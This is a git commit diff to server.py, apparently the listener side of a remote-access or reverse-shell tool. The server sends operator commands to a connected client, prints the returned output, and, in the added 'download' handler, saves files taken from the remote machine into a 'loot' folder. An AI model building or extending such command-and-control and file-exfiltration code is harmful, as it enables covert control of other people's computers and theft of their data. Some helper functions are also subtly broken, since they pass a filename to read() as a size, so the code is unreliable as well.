09670e02972d749170420353ed2b0019177398ac
AlexanderOMT <oscar_martin2001@hotmail.com>
2023-03-27 19:22:04 +0100

    v0.31 >> Small things fixed

--- server.py
+++ server.py
@@ -9,14 +9,19 @@ from threading import Thread
 import queue
 import time
 import input_output
+import os
+import base64
+import json
+import subprocess
 
 class Server:
     def __init__(self, host, port):
         self.host, self.port = host, port
 
-        self.EXIT_COMMAND = 'exit server'
-        self.REBOOT_COMMAND = 'reboot server'
+        self.EXIT_COMMAND = 'exit server\n'
+        self.REBOOT_COMMAND = 'reboot server\n'
         self.EMPTY_BYTE = b''
+        self.PATH_LOOT = os.getcwd() + '/loot/'
         self.thread_read_name = 'read_thread'
         self.thread_write_name = 'write_thread'
         self.time_out = 3.0
@@ -25,64 +30,87 @@ class Server:
         self.buffer = str()
         self.threads = list()
         self.handle_io_lock = threading.Lock()
+        self.interrupt = threading.Event()
 
         self.standard_stream = input_output.CustomStandardStream(
             thread_read_name = self.thread_read_name,
             thread_write_name = self.thread_write_name,
         )
-
-    def manage_flag(self):
-        # TODO refractor
-        if self.buffer == self.EXIT_COMMAND:
-            return True
-        if self.buffer == self.REBOOT_COMMAND:
-            return True
-        if self.buffer == self.EMPTY_BYTE:
-            return True
-        return False
     
     def _read_client(self, client_socket):
         client_socket.settimeout( self.time_out )
-        while True:
+        while self.buffer != self.REBOOT_COMMAND and self.buffer != self.EXIT_COMMAND:
             try:
                 read = client_socket.recv(1024)
                 assert read != self.EMPTY_BYTE, ConnectionError()
-                read = read.decode()
 
+                # TODO command patron
+                
+                if self.buffer.split(' ')[0] == 'download':
+                    name_file = self.buffer.split(' ')[1].rstrip()
+                    self.download_file(self.PATH_LOOT + name_file, content=read)
+                    self.handle_io_lock.acquire()
+                    self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify='Download succesful!')
+                    self.handle_io_lock.release()
+                    continue
+
+                read = read.decode()
                 self.handle_io_lock.acquire()
                 self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify=read)
                 self.handle_io_lock.release()
 
-            except socket.timeout:
-                pass
-            except AssertionError as e:
+            except AssertionError:
                 sys.stdout.write(f'\r[-] Connection broken, likely from client side. Rebooting Server...')
                 self.cli_queue.put(self.REBOOT_COMMAND)
                 break
-            except Exception:
+            except socket.timeout as e:
+                pass
+            except Exception as e:
+                #print(e)
                 pass
 
-            if self.manage_flag():
-                client_socket.close()
-                break
+        client_socket.close()
+                
 
     def _write_client(self, client_socket):
 
-        while True:
+        while self.buffer != self.REBOOT_COMMAND and self.buffer != self.EXIT_COMMAND:
 
-            self.handle_io_lock.acquire()
-            read_out = self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify=client_socket.getpeername())                   
-            self.handle_io_lock.release()
+            #self.handle_io_lock.acquire()
+            command = self.standard_stream.handle_io(thread_name=threading.current_thread().name, notify=client_socket.getpeername())                   
+            #self.handle_io_lock.release()                
 
-            self.cli_queue.put(read_out)
+            self.cli_queue.put(command)
     
             if self.cli_queue.qsize() > 0:   
                 self.buffer = self.cli_queue.get()
-                if self.manage_flag():
-                    client_socket.close()
-                    break
                 client_socket.sendall(bytes(self.buffer, encoding='utf8'))
-                
+
+        client_socket.close() 
+
+    
+    def download_file(self, path, content):
+        # TODO refractor
+        try:
+            with open(path, 'wb') as fd:
+                return fd.write(content)
+        except OSError:
+            os.mkdir(self.PATH_LOOT)
+            self.download_file(path, content)
+
+    def load_file(self, file):
+        with open(file, 'rb') as fd:
+            return fd.read(file)
+
+
+    def download_img(self, path, content):
+        with open(path, 'wb') as fd:
+            return fd.write( base64.b64decode(content) )
+            
+
+    def load_img(self, file):
+        with open(file, 'rb') as fd:
+            return base64.b64encode( fd.read(file) )
 
     def start(self):
         wait_threads = lambda list_thread: [thread.join() for thread in list_thread]
@@ -99,11 +127,14 @@ class Server:
             read_thread = threading.Thread(
                 target = self._read_client, args = (client_socket,), 
                 name = self.thread_read_name,
-                daemon=False, )
+                daemon = True, 
+                )
+
             write_thread = threading.Thread(
                 target = self._write_client, args = (client_socket,), 
                 name = self.thread_write_name,
-                daemon=False, )
+                daemon = True, 
+                )
 
             self.threads.append(read_thread)
             self.threads.append(write_thread)
@@ -120,11 +151,9 @@ class Server:
         self.close_server()
 
     def _stop_threads(self):
-        print(f'[+] Stopping threads...')
         for thread in self.threads:            
             if (thread.is_alive()):
-                time.sleep( self.time_out )    
-            print(f'[?] {thread.name} {type(thread)} alive: {thread.is_alive()}')
+                self.cli_queue.put(self.EXIT_COMMAND)
 
     def close_server(self):
         self.server.close()
